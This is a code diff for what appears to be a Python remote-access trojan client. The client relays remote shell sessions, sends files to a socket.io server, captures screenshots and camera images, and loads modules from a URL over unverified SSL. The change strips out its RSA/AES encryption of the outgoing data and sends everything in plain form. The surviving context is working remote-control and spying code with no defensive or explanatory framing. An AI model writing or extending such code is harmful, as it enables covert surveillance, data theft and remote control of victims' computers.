@@ -18,84 +18,6 @@ import re
 import zlib
 import cv2  # Import OpenCV for camera access
 import signal
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives import padding
-from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import serialization
-
-def get_public_key(url):
-    """
-    This function fetches the public RSA key from a URL that returns the PEM file.
-    The public key is used to encrypt the AES key for secure message transmission.
-    """
-    try:
-        context = ssl._create_unverified_context()
-        with urlopen(url, context=context) as response:
-            key_bytes = response.read()  # Read the data as raw bytes
-
-        # Decode the byte data to a string and clean it up
-        key_str = key_bytes.decode('utf-8').strip()  # Decode to string and strip any excess whitespace or newlines
-
-        # Replace literal '\n' with actual line breaks
-        key_str = key_str.replace(r'\n', '\n').replace("b'", "").replace("'", "")  # Ensure that literal '\n' is converted to actual newline characters
-
-        # Convert the cleaned-up string back to bytes
-        clean_key_bytes = key_str.encode('utf-8')  # Re-encode the cleaned string to bytes
-
-        # Return the loaded RSA public key
-        return serialization.load_pem_public_key(clean_key_bytes)
-    except:
-        return get_public_key(url)
-
-def decrypt(private_key, encrypted_data):
-    # Step 1: Separate the encrypted AES key, IV, and ciphertext
-    encrypted_aes_key = encrypted_data[:256]  # RSA-encrypted AES key (2048 bits = 256 bytes)
-    iv = encrypted_data[256:272]  # The IV is 16 bytes long
-    ciphertext = encrypted_data[272:]  # The rest is the AES-encrypted message
-
-    # Step 2: Decrypt the AES key using RSA (private key)
-    aes_key = private_key.decrypt(
-        encrypted_aes_key,
-        asym_padding.OAEP(
-            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-
-def encrypt(public_key, message):
-    """
-    Encrypt a message using AES encryption. The AES key is then encrypted with RSA for transmission.
-    """
-    # Step 1: Generate a random AES key (256-bit)
-    aes_key = os.urandom(32)  # AES 256-bit key
-
-    # Step 2: Encrypt the message using AES (CBC mode)
-    padder = padding.PKCS7(algorithms.AES.block_size).padder()
-    padded_data = padder.update(message.encode('utf-8')) + padder.finalize()
-
-    # Encrypt the data using AES (CBC mode)
-    iv = os.urandom(16)  # Initialization vector (16 bytes)
-    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
-    encryptor = cipher.encryptor()
-    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
-
-    # Step 3: Encrypt the AES key using the RSA public key
-    encrypted_aes_key = public_key.encrypt(
-        aes_key,
-        asym_padding.OAEP(
-            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-
-    # Combine the encrypted AES key, IV, and ciphertext into one block to send
-    encrypted_message = encrypted_aes_key + iv + ciphertext
-    return encrypted_message
-
 
 # Platform check for GUI libraries
 if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
@@ -117,9 +39,8 @@ shells = {}
 
 INACTIVITY_TIMEOUT = 30 * 60  # 30 minutes timeout in seconds
 
-def run(data, private_key):
-    print(private_key)
-    public_key = get_public_key(data['url']+"key")
+def run(data):
+    #public_key = get_public_key(data['url']+"key")
 
     def create_module(url):
         # Create an SSL context that doesn't verify certificates
@@ -192,7 +113,7 @@ def run(data, private_key):
                         .decode(errors="ignore")
                     )
                     if output:
-                        sio.emit("result", encrypt(public_key, json.dumps({"key": self.key, "result": output, 'uid':self.uid})))
+                        sio.emit("result", {"key": self.key, "result": output, 'uid':self.uid})
                         self.reset_inactivity_timer()  # Reset timer on output
                 except OSError:
                     break
@@ -200,7 +121,7 @@ def run(data, private_key):
         def read_output_windows(self):
             while self.process.isalive():
                 output = self.process.read()
-                sio.emit("result", encrypt(public_key, json.dumps({"key": self.key, "result": output, 'uid':self.uid})))
+                sio.emit("result", {"key": self.key, "result": output, 'uid':self.uid})
                 self.reset_inactivity_timer()  # Reset timer on output
 
         def write_input(self, command):
@@ -255,11 +176,8 @@ def run(data, private_key):
 
     @sio.event
     def connect():
-        public_key = get_public_key(data['url']+"key")
 
-        #data['public_key'] = private_key.public_key()
-
-        sio.emit("mConnect", encrypt(public_key, json.dumps(data)))
+        sio.emit("mConnect", json.dumps(data))
         # Start a new thread to run the emit_screen_count function
 
         threading.Thread(target=emit_screen_count, args=(data,)).start()
@@ -283,13 +201,13 @@ def run(data, private_key):
                 f.close()
             file_ready = zlib.compress(base64.b64encode(file), level=9)
             sio.emit(
-                "download_file_return", encrypt(public_key, json.dumps(
+                "download_file_return",
                 {
                     "uid": data_new["uid"],
                     "file_name": data_new["file_path"],
                     "file": file_ready,
                 },
-            )))
+            )
             print("emited")
 
     @sio.on("pem")
@@ -513,7 +431,7 @@ def run(data, private_key):
                             compressed_data = zlib.compress(jpeg_data, level=9)
 
                             # Emit the compressed data
-                            sio.emit("screenshot", encrypt(public_key, json.dumps({"uid": uid, "image": compressed_data.decode("latin-1")})))
+                            sio.emit("screenshot", json.dumps({"uid": uid, "image": compressed_data.decode("latin-1")}))
                             print("Sent compressed screenshot")
 
                             last_capture_time = current_time
@@ -551,7 +469,7 @@ def run(data, private_key):
                     compressed_data = zlib.compress(jpeg_data, level=9)
 
                     # Emit the compressed data
-                    sio.emit("screenshot", encrypt(public_key, json.dumps({"uid": uid, "image": compressed_data.decode("latin-1")})))
+                    sio.emit("screenshot", json.dumps({"uid": uid, "image": compressed_data.decode("latin-1")}))
                     print("Sent compressed camera screenshot")
 
                     last_capture_time = current_time
@@ -588,7 +506,7 @@ def run(data, private_key):
                 if len(sct.monitors)-1 < 1:  # No monitors detected
                     print("No monitors found. Skipping screen capture.")
                 else:
-                    sio.emit('screen_count', encrypt(public_key, json.dumps({ 'uid': data['uid'], 'screen_count': len(sct.monitors)-1 })))
+                    sio.emit('screen_count', json.dumps({ 'uid': data['uid'], 'screen_count': len(sct.monitors)-1 }))
 
     @sio.on("recover")            
     def recover(data_new):
